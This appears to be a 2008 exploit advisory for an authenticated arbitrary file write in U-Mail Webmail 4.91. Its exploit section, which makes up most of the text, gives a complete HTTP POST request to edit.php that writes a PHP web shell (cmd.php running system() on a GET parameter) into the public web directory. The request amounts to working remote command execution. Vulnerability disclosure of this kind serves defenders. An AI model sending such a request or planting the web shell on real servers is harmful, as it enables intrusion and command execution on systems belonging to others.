@@ -1,0 +1,36 @@
+U-Mail Webmail Arbitrary File Write Vulnerability
+
+==================================================
+
+Vulnerable: 	U-Mail 4.91 
+Vendors:	www.comingchina.com	
+Category:   	Input Validation Error
+Impact:		An attacker can write arbitrary data to new files.
+Author:		Shennan Wang
+Date:		2008-10-30
+Web:		http://hi.baidu.com/nansec
+
+
+Details:
+=========	
+This vulnerability allows remote attackers to write arbitrary file on vulnerable installations of U-Mail Webmail Server. Authentication is required to exploit this vulnerability.The specific flaw exists in the 'edit.php' file running on the U-Mail Webmail Server. A malicious HTTP POST request can write arbitrary file to the publicly accessible web directories.
+
+
+Exploit:
+=========
+POST /webmail/modules/filesystem/edit.php HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-silverlight, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, */*
+Referer: http://mail.d4rkn3t.cn/webmail/modules/filesystem/edit.php
+Accept-Language: zh-cn
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
+Host: mail.d4rkn3t.cn
+Content-Length: 120
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: GO_AUTH_SOURCE_KEY=0; LANGUAGE_CK=zh_CN; SCREEN_CK=Default+Style; PHPSESSID=0fa330ffdfd62d9e1bd8bd3942974a18
+
+path=/var/www/htdocs/webmail/cmd.php&task=save&name=cmd.php&content=<?system($_GET[cmd]);?>
+
+# milw0rm.com [2008-10-31]
